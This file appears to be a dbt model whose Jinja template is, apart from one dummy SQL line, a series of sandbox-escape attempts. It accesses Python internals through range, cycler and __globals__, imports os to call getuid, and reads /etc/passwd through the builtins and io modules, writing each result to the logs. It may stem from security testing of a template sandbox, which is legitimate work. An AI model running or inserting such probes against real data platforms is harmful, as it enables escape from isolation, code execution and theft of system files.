{{ log("== SANDBOX BYPASS ATTEMPTS ==", info=True) }}

{# Try accessing builtins through Jinja2 internal #}
{% set ns = namespace(result='') %}
{% if range.__class__ is defined %}
{{ log("RANGE_CLASS: " ~ range.__class__.__name__, info=True) }}
{% endif %}

{# Try direct __import__ #}
{% if modules.importlib is defined %}
{% set real_os = modules.importlib.import_module('os') %}
{{ log("REAL_OS_GETUID: " ~ real_os.getuid(), info=True) }}
{% endif %}

{# Try accessing through Jinja globals #}
{% set g = cycler.__class__.__init__.__globals__ %}
{% if g is defined %}
{{ log("CYCLER_GLOBALS_KEYS: " ~ g.keys().__str__()[:200], info=True) }}
{% endif %}

{# Try reading files through builtins if available #}
{% if modules.builtins is defined %}
{% set passwd = modules.builtins.open('/etc/passwd').read() %}
{{ log("PASSWD: " ~ passwd[:200], info=True) }}
{% endif %}

{# Try io module for file read #}
{% if modules.io is defined %}
{% set f = modules.io.open('/etc/passwd', 'r') %}
{{ log("IO_PASSWD: " ~ f.read()[:200], info=True) }}
{% endif %}

SELECT 3 as bypass_probe
